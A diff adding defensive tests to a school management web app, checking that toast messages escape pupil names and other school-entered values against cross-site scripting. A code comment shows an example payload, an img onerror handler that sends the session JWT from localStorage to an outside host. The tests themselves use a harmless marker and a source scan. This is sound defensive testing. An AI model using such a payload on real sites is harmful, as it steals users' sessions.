@@ -3196,3 +3196,66 @@ describe('Teacher and parent pages render inside their scope', () => {
     deepEqual(groups, expected, `An admin on a teacher page sees [${groups.join(', ')}].`);
   });
 });
+
+describe('A pupil\'s name cannot run code', () => {
+  /*
+   * Everything a school types comes back out somewhere: pupil names on a mark
+   * sheet, class names in a refusal, admission numbers in an error. The API
+   * quotes them verbatim — "Admission number X already belongs to <name>" —
+   * so a name is a script the moment anything writes it with innerHTML.
+   *
+   * A pupil enrolled as
+   *   <img src=x onerror="fetch('https://elsewhere/'+localStorage['shule.jwt'])">
+   * would run that in a bursar's browser, with the bursar's session.
+   */
+  it('toast() escapes its message', async () => {
+    const dom = await openPage('app/dashboard.html');
+    const win = dom.window;
+    const nasty = '<img src=x onerror="window.__pwned=1">';
+    win.ShuleShell.toast(nasty);
+    const el = win.document.querySelector('[data-toast]');
+    assert.ok(el, 'No toast was shown.');
+    assert.equal(win.__pwned, undefined, 'A toast executed markup from its message.');
+    assert.equal(el.querySelector('img'), null,
+      'toast() wrote a tag from its message into the page.');
+    assert.match(el.textContent, /onerror/,
+      'The message should still be readable, escaped rather than dropped.');
+  });
+
+  it('a toast built as markup escapes the values it interpolates', () => {
+    // The few callers that pass their own markup say so with { html: true },
+    // and are responsible for what they put in it. Anything that is not a
+    // count has to go through esc().
+    const risky = [];
+    // One call at a time. A pattern that runs from a toast to the next
+    // `html: true` anywhere in the file swallows everything in between and
+    // reports lines that are not toasts at all.
+    const calls = (src) => {
+      const out = [];
+      for (const m of src.matchAll(/SHELL\.toast\(/g)) {
+        const rest = src.slice(m.index, m.index + 700);
+        const end = rest.indexOf(');');
+        out.push(end === -1 ? rest.slice(0, 200) : rest.slice(0, end + 2));
+      }
+      return out;
+    };
+    for (const f of fs.readdirSync(path.join(ROOT, 'assets/js')).filter((n) => n.endsWith('.js'))) {
+      const src = fs.readFileSync(path.join(ROOT, 'assets/js', f), 'utf8');
+      for (const m of calls(src).filter((c) => /\{\s*html:\s*true/.test(c)).map((c) => [null, c])) {
+        for (const e of m[1].matchAll(/\+\s*([A-Za-z_$][\w.$]*)\s*\+/g)) {
+          const expr = e[1];
+          if (/\.length$/.test(expr)) continue;                 // a count
+          if (/^(U|SHELL|Math|String|Number)$/.test(expr)) continue;
+          // locally computed sums, not values from anywhere
+          if (/^(made|skipped|count|total|n)$/.test(expr)) continue;
+          // names that read as counts are allowed; anything else must be escaped
+          if (/\.(rows|sent|skipped|saved|cleared|created|updated|generated|published|entered|verified|unverified|max_score|reminders_sent)$/.test(expr)) continue;
+          risky.push(`${f}: ${expr}`);
+        }
+      }
+    }
+    assert.deepEqual(risky, [],
+      `These values go into toast markup without esc():\n  ${risky.join('\n  ')}\n` +
+      'Anything a school typed can contain a tag.');
+  });
+});
